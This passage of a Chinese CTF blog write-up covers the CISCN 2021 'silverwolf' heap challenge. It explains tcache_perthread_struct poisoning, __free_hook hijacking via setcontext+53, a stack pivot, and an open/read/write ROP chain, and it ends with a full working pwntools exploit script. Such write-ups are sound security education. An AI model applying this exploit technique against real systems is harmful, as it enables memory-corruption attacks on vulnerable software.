+<h4 id="准备-ROP-gadgets-地址和函数地址"><a href="#准备-ROP-gadgets-地址和函数地址" class="headerlink" title="准备 ROP  gadgets 地址和函数地址"></a>准备 ROP  gadgets 地址和函数地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x02155f</span> </span><br><span class="line">pop_rax = libc_base + <span class="number">0x0439c8</span> </span><br><span class="line">pop_rsi = libc_base + <span class="number">0x23e6a</span>  </span><br><span class="line">pop_rdx = libc_base + <span class="number">0x001b96</span> </span><br><span class="line">read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br><span class="line">syscall=libc_base+<span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;syscall\nret&quot;</span>)))</span><br><span class="line">flag_addr = heap_base + <span class="number">0x1000</span></span><br><span class="line">ret = libc_base + <span class="number">0x8aa</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>由于启用了 seccomp 限制了 system(“&#x2F;bin&#x2F;sh”)，必须使用 ORW (Open, Read, Write) 手段读文件。</li>
+<li>这里计算了大量 ROP 需要用到的汇编代码片段（Gadgets）的真实内存地址。</li>
+<li><strong>setcontext &#x3D; … + 53</strong>: 这是 glibc 2.27 经典技巧。setcontext 函数内部包含一段可以直接根据寄存器（由 rdi 指向的内存）恢复所有程序上下文的汇编。加上偏移 53 可以避开开头的 sigprocmask 调用，直接执行 mov rsp, [rdi+0xa0] 等指令，实现栈迁移。</li>
+</ul>
+<p>有一说一，gadgets 还是挺不好找的，syscall 找不到对应的，在网上看到了另一种寻找偏移方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary /home/kali/Desktop/glibc-<span class="built_in">all</span>-<span class="keyword">in</span>-one/libs/<span class="number">2.27</span>-3ubuntu1_amd64/libc-<span class="number">2.27</span>.so |  grep <span class="string">&quot;rax&quot;</span> </span><br></pre></td></tr></table></figure>
+
+<p><img src="/HFTTC.github.io/./img/f6ksCbZdb7oGcZDf/1775729808027-810d7383-7474-4df3-9c41-ce35fcec138a-725249.png" alt="1775729808027-810d7383-7474-4df3-9c41-ce35fcec138a.png"></p>
+<h4 id="篡改-Tcache-Entries-数组实现多次任意地址分配"><a href="#篡改-Tcache-Entries-数组实现多次任意地址分配" class="headerlink" title="篡改 Tcache Entries 数组实现多次任意地址分配"></a>篡改 Tcache Entries 数组实现多次任意地址分配</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;\x02&#x27;</span>*<span class="number">0x40</span></span><br><span class="line">payload += p64(free_hook)          <span class="comment"># 对应 0x20 大小的 bin</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x1000</span>) <span class="comment"># 对应 0x40 大小的 bin (放 flag 字符串)</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x2000</span>) <span class="comment"># 对应 0x50 大小的 bin (stack)</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x20A0</span>) <span class="comment"># 对应 0x60 大小的 bin (stack)</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x3000</span>) <span class="comment"># 对应 0x70 大小的 bin (orw1)</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x3060</span>) <span class="comment"># 对应 0x80 大小的 bin (orw2)</span></span><br><span class="line">edit(payload) </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>此时 index 0 依然指向 tcache_perthread_struct。</li>
+<li>b’\x02’*0x40: 把所有大小的 tcache bin 的计数器都设置为 2。</li>
+<li>接下来的内容覆盖了 tcache_perthread_struct 中的 entries 数组，即不同大小的 free chunk 的链表头指针</li>
+<li>通过这样构造，后续申请特定大小的内存时，会直接返回我们伪造的任意地址。例如，申请大小为 0x20 的 chunk 时，malloc 会直接把 __free_hook 的地址交给我们。</li>
+</ul>
+<h4 id="部署-ORW-链与触发-setcontext"><a href="#部署-ORW-链与触发-setcontext" class="headerlink" title="部署 ORW 链与触发 setcontext"></a>部署 ORW 链与触发 setcontext</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造 ORW ROP 链</span></span><br><span class="line">orw = p64(pop_rdi) + p64(flag_addr)</span><br><span class="line">orw += p64(pop_rax) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall)               <span class="comment"># sys_open(&#x27;./flag&#x27;, 0)</span></span><br><span class="line"></span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(pop_rsi) + p64(heap_base  + <span class="number">0x3000</span>)</span><br><span class="line">orw += p64(pop_rdx) + p64(<span class="number">0x20</span>)</span><br><span class="line">orw += p64(read)                  <span class="comment"># read(3, heap_base + 0x3000, 0x20)</span></span><br><span class="line"></span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(write)                 <span class="comment"># write(1, heap_base + 0x3000, 0x20)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用前面的伪造，往特定地址写数据</span></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">edit(p64(setcontext))             <span class="comment"># 申请 0x20 拿到 __free_hook，写入 setcontext</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">这里是劫持__free_hook, 当下一次free的时候就不会释放内存，而是直接跳转到setcontext+53当中</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">edit(<span class="string">&#x27;./flag&#x27;</span>)                    <span class="comment"># 申请 0x40 拿到 heap + 0x1000，写入 &quot;./flag&quot; 字符串</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">edit(orw[:<span class="number">0x60</span>])                  <span class="comment"># 申请 0x70 拿到 heap + 0x3000，写入 ORW 链前半段</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">edit(orw[<span class="number">0x60</span>:])                  <span class="comment"># 申请 0x80 拿到 heap + 0x3060，写入 ORW 链后半段</span></span><br><span class="line"> </span><br><span class="line">add(<span class="number">0x58</span>)                         <span class="comment"># 申请 0x60 拿到 heap + 0x20A0 --&gt; [rdi+0xA0]</span></span><br><span class="line">edit(p64(heap_base + <span class="number">0x3000</span>) + p64(ret))        <span class="comment"># 设置 setcontext 需要的 rsp 和 rcx 寄存器值</span></span><br><span class="line"><span class="comment">#    [heap + 0x20A0]rsp        [heap + 0x20A8]rcx</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x48</span>)                         <span class="comment"># 申请 0x50 拿到 heap + 0x2000 --&gt; rdi</span></span><br><span class="line">free()</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">当 free() 被调用时发生的事情：</span></span><br><span class="line"><span class="string">1. 因为 __free_hook 被改成了 setcontext+53，程序跳入该汇编片段。</span></span><br><span class="line"><span class="string">2. 此时 rdi = heap_base + 0x2000</span></span><br><span class="line"><span class="string">3. 执行 mov rsp, [rdi+0xA0] → rsp = [heap_base + 0x20A0] → rsp 变成了 heap_base + 0x3000。</span></span><br><span class="line"><span class="string">4. 执行 mov rcx, [rdi+0xA8] → rcx = [heap_base + 0x20A8] → rcx 变成了 ret 指令地址。</span></span><br><span class="line"><span class="string">5. 执行 push rcx; ret→ 程序跳转到 ret。而 ret 会直接从当前的 rsp 弹出一个地址执行。</span></span><br><span class="line"><span class="string">6. 此时 rsp 就在 heap_base + 0x3000，栈成功迁移到了堆上，ROP 链正式开始执行！</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/HFTTC.github.io/./img/f6ksCbZdb7oGcZDf/1775706611329-9350e679-66cd-42db-ab55-806788b602c7-918876.webp" alt="1775706611329-9350e679-66cd-42db-ab55-806788b602c7.png"></p>
+<ul>
+<li><strong>orw &#x3D; …</strong>: 用汇编指令构造了相当于 open(“.&#x2F;flag”, 0) -&gt; read(fd, buf, 0x20) -&gt; write(1, buf, 0x20) 的 ROP 执行流。</li>
+<li><strong>add 与 edit 配合</strong>: 这几步将 ROP 链、目标文件路径（.&#x2F;flag）、以及触发环境精确放置到了前面规划好的堆地址中，并将 __free_hook 劫持为了 setcontext。</li>
+<li><strong>free()</strong>: 触发点！调用 free(chunk) 时，因为 __free_hook 被覆盖，实际上执行的是 setcontext(chunk_addr)。此时 rdi 指向正在释放的 chunk，setcontext 会将程序栈指针 (rsp) 劫持到我们放置在 heap_base + 0x3000 的 ROP 链处，并开始依次执行 Open、Read、Write 读取并打印出 flag。</li>
+<li><strong>io.interactive()</strong>: 交互模式，将控制权交还给用户，准备在屏幕上接收打印出来的 flag。</li>
+</ul>
+<h3 id="总-EXP："><a href="#总-EXP：" class="headerlink" title="总 EXP："></a>总 EXP：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./silverwolf&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;node4.anna.nssctf.cn&#x27;,20065)</span></span><br><span class="line">io = process( <span class="string">&quot;./silverwolf&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/kali/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.27.so&#x27;)</span></span><br><span class="line"><span class="comment"># context.terminal=[&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, content) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line">    edit(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    <span class="comment"># edit(&#x27;\x00&#x27;*0x10)</span></span><br><span class="line">    free()</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">log.success(<span class="string">&#x27;heap_base -&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x23</span> + <span class="string">&#x27;\x07&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x70</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x02155f</span> <span class="comment"># 0x215bf</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x0439c8</span> <span class="comment"># 0x43ae8</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x23e6a</span>  <span class="comment"># 0x23eea</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x001b96</span> <span class="comment"># 0x1b96</span></span><br><span class="line">read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br><span class="line">syscall=libc_base+<span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;syscall\nret&quot;</span>)))</span><br><span class="line"><span class="comment"># syscall = libc_base + 0x116758   # 0xE5965</span></span><br><span class="line">flag_addr = heap_base + <span class="number">0x1000</span></span><br><span class="line">ret = libc_base + <span class="number">0x8aa</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#add(0,0x240)</span></span><br><span class="line">payload = <span class="string">b&#x27;\x02&#x27;</span>*<span class="number">0x40</span></span><br><span class="line">payload += p64(free_hook)<span class="comment">#0x20</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x1000</span>)<span class="comment">#flag #0x30</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x2000</span>)<span class="comment">#stack #0x40</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x20A0</span>)<span class="comment">#stack 0x60</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x3000</span>)<span class="comment">#orw1 #0x50</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x3060</span>)<span class="comment">#orw2 #0x60</span></span><br><span class="line"><span class="comment"># pasue()</span></span><br><span class="line">edit(payload)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">orw = p64(pop_rdi) + p64(flag_addr)</span><br><span class="line">orw += p64(pop_rax) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(pop_rsi) + p64(heap_base  + <span class="number">0x3000</span>)</span><br><span class="line">orw += p64(pop_rdx) + p64(<span class="number">0x20</span>)</span><br><span class="line">orw += p64(read)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(write)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">edit(p64(setcontext))</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">edit(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">edit(orw[:<span class="number">0x60</span>])</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">edit(orw[<span class="number">0x60</span>:])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x58</span>)</span><br><span class="line">edit(p64(heap_base + <span class="number">0x3000</span>)+p64(ret))</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">free()</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/HFTTC.github.io/./img/f6ksCbZdb7oGcZDf/1775732899284-8a337bef-39af-4803-80b4-ac04243d87b3-603419.png" alt="1775732899284-8a337bef-39af-4803-80b4-ac04243d87b3.png"></p>
+<blockquote>
+<p>更新: 2026-04-20 15:58:44<br>原文: <a target="_blank" rel="noopener" href="https://www.yuque.com/idcm/wnemg9/wimy9lqmwh06ybs9">https://www.yuque.com/idcm/wnemg9/wimy9lqmwh06ybs9</a></p>
+</blockquote>
+
+    </div>
+    <footer class="article-footer">
+      
+      
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="SetContentShellcode" class="lazyload">
+        <a href="/HFTTC.github.io/2026/04/28/PWN/PWNCTF/SetContentShellcode/" aria-label="前一篇: SetContentShellcode" title="前一篇: SetContentShellcode"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            SetContentShellcode
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="RustPwn" class="lazyload">
+      <a href="/HFTTC.github.io/2026/04/28/PWN/PWNCTF/RustPwn/" aria-label="后一篇: RustPwn"  title="后一篇: RustPwn"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          RustPwn
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      SEZUVEM=
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        292.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        24:34
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SetContent-ORW-libc-2-27"><span class="toc-number">1.</span> <span class="toc-text">SetContent ORW libc-2.27</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN-2021-%E5%88%9D%E8%B5%9B-silverwolf-libc-2-27-SetContent-ORW"><span class="toc-number">1.1.</span> <span class="toc-text">[CISCN 2021 初赛]silverwolf(libc-2.27 SetContent+ORW)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">程序分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B4%E7%90%86%E4%B8%80%E4%B8%8B%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">1.2.1.</span> <span class="toc-text">整理一下思路：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">EXP 思路：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%81%E8%A3%85%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">1.3.1.</span> <span class="toc-text">封装函数：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2-heap-%E5%9F%BA%E5%9C%B0%E5%9D%80"><span class="toc-number">1.3.2.</span> <span class="toc-text">泄露 heap 基地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2-libc-%E5%9F%BA%E5%9C%B0%E5%9D%80"><span class="toc-number">1.3.3.</span> <span class="toc-text">泄露 libc 基地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%86%E5%A4%87-ROP-gadgets-%E5%9C%B0%E5%9D%80%E5%92%8C%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="toc-number">1.3.4.</span> <span class="toc-text">准备 ROP  gadgets 地址和函数地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AF%A1%E6%94%B9-Tcache-Entries-%E6%95%B0%E7%BB%84%E5%AE%9E%E7%8E%B0%E5%A4%9A%E6%AC%A1%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%88%86%E9%85%8D"><span class="toc-number">1.3.5.</span> <span class="toc-text">篡改 Tcache Entries 数组实现多次任意地址分配</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%83%A8%E7%BD%B2-ORW-%E9%93%BE%E4%B8%8E%E8%A7%A6%E5%8F%91-setcontext"><span class="toc-number">1.3.6.</span> <span class="toc-text">部署 ORW 链与触发 setcontext</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB-EXP%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">总 EXP：</span></a></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
